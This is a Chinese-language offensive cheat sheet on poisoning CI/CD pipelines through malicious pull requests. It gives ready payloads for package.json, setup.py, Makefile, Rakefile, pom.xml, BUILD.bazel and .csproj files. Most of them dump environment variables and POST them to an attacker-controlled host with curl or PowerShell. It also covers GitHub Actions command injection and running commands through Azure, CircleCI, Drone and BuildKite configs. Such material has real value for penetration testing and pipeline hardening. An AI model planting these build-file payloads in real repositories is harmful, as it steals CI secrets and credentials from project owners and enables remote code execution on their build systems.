# CI/CD攻击

> CI/CD管道通常由不受信任的操作触发，例如公共git仓库的分叉拉取请求和新问题提交。
> 这些系统通常包含敏感秘密或在特权环境中运行。
> 攻击者可以通过提交精心设计的有效负载来触发这些管道，从而获得RCE（远程代码执行）进入这些系统。
> 这类漏洞也被称为“Poisoned Pipeline Execution（PPE，中毒的管道执行）”

## 摘要

- CI/CD攻击
  - 摘要
  - 工具
  - 包管理器与构建文件
    - Javascript / Typescript - package.json
    - Python - setup.py
    - Bash / sh - *.sh
    - Maven / Gradle
    - BUILD.bazel
    - Makefile
    - Rakefile
    - C# - *.csproj
  - CI/CD产品
    - GitHub Actions
    - Azure Pipelines (Azure DevOps)
    - CircleCI
    - Drone CI
    - BuildKite
  - 参考资料

## 工具

- praetorian-inc/gato - GitHub自托管运行器枚举和攻击工具

## 包管理器与构建文件

> 向构建文件中注入代码不依赖于特定的CI系统，因此当您不知道哪个系统构建了仓库，或者流程中存在多个CI时，它们成为很好的目标。
> 在下面的示例中，您需要将文件替换为示例有效负载，或通过编辑现有文件的一部分向其中注入自己的有效负载。

> 如果CI构建了分叉的拉取请求，那么您的有效负载可能在CI中运行。

### Javascript / Typescript - package.json

> `package.json`文件被许多Javascript / Typescript包管理器（`yarn`,`npm`,`pnpm`,`npx`等）使用。

> 该文件可能包含一个带有自定义命令运行`scripts`对象。
> `preinstall`、`install`、`build`和`test`在大多数CI/CD管道中通常会默认执行——因此它们是注入的好地方。
> 如果您遇到`package.json`文件——编辑`scripts`对象并在其中注入您的指令

注意：上述说明中的有效负载必须是`json转义`的。

示例：

```json
{
  "name": "my_package",
  "description": "",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "set | curl -X POST --data-binary @- {YourHostName}",
    "install": "set | curl -X POST --data-binary @- {YourHostName}",
    "build": "set | curl -X POST --data-binary @- {YourHostName}",
    "test": "set | curl -X POST --data-binary @- {YourHostName}"
  },
  "repository": {
    "type": "git",
    "url": "https://github.com/foobar/my_package.git"
  },
  "keywords": [],
  "author": "C.Norris"
}
```

### Python - setup.py

> `setup.py`在Python的包管理器的构建过程中被使用。
> 它通常会默认执行。
> 用以下有效负载替换`setup.py`文件可能会触发CI的执行。

```python
import os

os.system('set | curl -X POST --data-binary @- {YourHostName}')
```

### Bash / sh - *.sh

> 仓库中的Shell脚本通常在自定义CI/CD管道中执行。
> 替换仓库中所有的`.sh`文件并提交拉取请求可能会触发CI执行它们。

```shell
set | curl -X POST --data-binary @- {YourHostName}
```

### Maven / Gradle

> 这些包管理器配有“包装器”，有助于运行构建/测试项目的自定义命令。
> 这些包装器本质上是可执行的shell/cmd脚本。
> 用您的有效负载替换它们以执行：

- `gradlew`
- `mvnw`
- `gradlew.bat` (Windows)
- `mvnw.cmd` (Windows)

偶尔仓库中不存在包装器。
在这种情况下，您可以编辑`pom.xml`文件，该文件指示maven获取哪些依赖项以及运行哪些`插件`。
有些插件允许代码执行，以下是常见插件`org.codehaus.mojo`的一个例子。\

> 如果您要定位的`pom.xml`文件已经包含了一个`<plugins>`指令，那么只需在其下添加另一个`<plugin>`节点。
> 如果**不**包含`<plugins>`节点，则在`<build>`节点下添加它。

注意：请记住，您的有效负载插入在一个XML文档中——必须转义XML特殊字符。

```xml
<build>
   <plugins>
           <plugin>
               <groupId>org.codehaus.mojo</groupId>
               <artifactId>exec-maven-plugin</artifactId>
               <version>1.6.0</version>
               <executions>
                   <execution>
                        <id>run-script</id>
                       <phase>validate</phase>
                       <goals>
                            <goal>exec</goal>
                        </goals>
                    </execution>
                </executions>
               <configuration>
                   <executable>bash</executable>
                   <arguments>
                       <argument>
                            -c
                        </argument>
                       <argument>{XML-Escaped-Payload}</argument>
                    </arguments>
                </configuration>
            </plugin>
    </plugins>
</build>
```

### BUILD.bazel

> 用以下有效负载替换`BUILD.bazel`的内容

注意：`BUILD.bazel`需要转义反斜杠。
在有效负载内部，将任何`\`替换为`\\`。

```shell
genrule(
    name = "build",
    outs = ["foo"],
    cmd = "{Escaped-Shell-Payload}",
    visibility = ["//visibility:public"],
)
```

### Makefile

> Make文件通常由`C`、`C++`或`Go`项目（但不限于这些）的构建管道执行。
> 执行`Makefile`的工具有几个，最常见的是`GNU Make`和`Make`。
> 用以下有效负载替换目标`Makefile`

```shell
.MAIN: build
.DEFAULT_GOAL := build
.PHONY: all
all: 
	set | curl -X POST --data-binary @- {YourHostName}
build: 
	set | curl -X POST --data-binary @- {YourHostName}
compile:
    set | curl -X POST --data-binary @- {YourHostName}
default:
    set | curl -X POST --data-binary @- {YourHostName}
```

### Rakefile

> Rake文件类似于`Makefile`，但用于Ruby项目。
> 用以下有效负载替换目标`Rakefile`

```shell
task :pre_task do
  sh "{Payload}"
end

task :build do
  sh "{Payload}"
end

task :test do
  sh "{Payload}"
end

task :install do
  sh "{Payload}"
end

task :default => [:build]
```

### C# - *.csproj

> `.csproj`文件是`C#`运行时的构建文件。
> 它们被构造成XML文件，包含了构建项目所需的不同依赖项。
> 用以下有效负载替换仓库中所有的`.csproj`文件可能会触发CI执行它们。

注意：由于这是一个XML文件——必须转义XML特殊字符。

```powershell
<Project>
<Target Name="SendEnvVariables" BeforeTargets="Build;BeforeBuild;BeforeCompile">
   <Exec Command="powershell -Command &quot;$envBody = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((Get-ChildItem env: | Format-List | Out-String))); Invoke-WebRequest -Uri {YourHostName} -Method POST -Body $envBody&quot;" />
 </Target>
</Project>
```

## CI/CD产品

### GitHub Actions

GH操作的配置文件位于目录`.github/workflows/`
您可以根据其触发器（`on`）指令判断操作是否构建拉取请求：

```yaml
on:
  push:
    branches:
      - master
  pull_request:
```

为了在构建拉取请求的操作中运行操作系统命令——只需向其添加一个`run`指令。
如果操作在其`run`指令中动态评估不受信任的输入作为其一部分，则该操作也可能容易受到命令注入的攻击：

```yaml
jobs:
  print_issue_title:
    runs-on: ubuntu-latest
    name: 打印问题标题
    steps:
    - run: echo "${{github.event.issue.title}}"
```

### Azure Pipelines (Azure DevOps)

Azure管道的配置文件通常位于仓库的根目录，并命名为——`azure-pipelines.yml`
您可以根据其触发器指令判断管道是否构建拉取请求。寻找`pr:`指令：

```yaml
trigger:
  branches:
      include:
      - master
      - refs/tags/*
pr:
- master
```

### CircleCI

CircleCI构建的配置文件位于`.circleci/config.yml`
默认情况下，CircleCI管道不会构建分叉的拉取请求。这是一个可选功能，应该由管道所有者启用。

为了在构建拉取请求的工作流中运行操作系统命令——只需向步骤添加一个`run`指令。

```yaml
jobs:
  build:
    docker:
     - image: cimg/base:2022.05
    steps:
        - run: echo "向YAML问好！"
```

### Drone CI

Drone构建的配置文件位于`.drone.yml`
Drone构建通常是自托管的，这意味着您可能会获得对运行运行器的kubernetes集群或托管云环境的过度权限。

为了在构建拉取请求的工作流中运行操作系统命令——只需向步骤添加一个`commands`指令。

```yaml
steps:
  - name: 做点什么
    image: some-image:3.9
    commands:
      - {Payload}
```

### BuildKite

BuildKite构建的配置文件位于`.buildkite/*.yml`
BuildKite构建通常是自托管的，这意味着您可能会获得对运行运行器的kubernetes集群或托管云环境的过度权限。

为了在构建拉取请求的工作流中运行操作系统命令——只需向步骤添加一个`command`指令。

```yaml
steps:
  - label: "示例测试"
    command: echo "你好！"
```

## 参考资料

- Poisoned Pipeline Execution
- DEF CON 25 - spaceB0x - 利用持续集成（CI）和自动化构建系统
- Azure-Devops-Command-Injection
